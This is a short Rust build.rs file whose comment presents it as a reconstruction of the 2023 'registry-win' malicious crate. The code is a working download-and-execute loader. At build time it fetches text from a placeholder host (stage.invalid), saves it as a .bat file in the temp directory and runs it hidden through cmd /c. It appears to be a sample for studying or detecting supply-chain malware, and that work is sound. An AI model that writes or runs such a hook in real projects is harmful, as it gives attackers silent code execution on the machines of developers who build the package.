// real registry-win (2023) shape: build.rs downloads text, saves it as .bat, runs it hidden via cmd /c
use std::{env, fs, fs::File, io::Write, process::{Command, Stdio}};
fn main() {
    let dir = env::temp_dir();
    let body = reqwest::blocking::get("https://stage.invalid/p.txt").unwrap().text().unwrap();
    let p = dir.join("x.txt");
    let mut f = File::create(&p).unwrap();
    write!(f, "{}", body).unwrap();
    let bat = dir.join("x.bat");
    fs::rename(&p, &bat).unwrap();
    Command::new("cmd").arg("/c").arg(bat).stdout(Stdio::null()).spawn().ok();
}
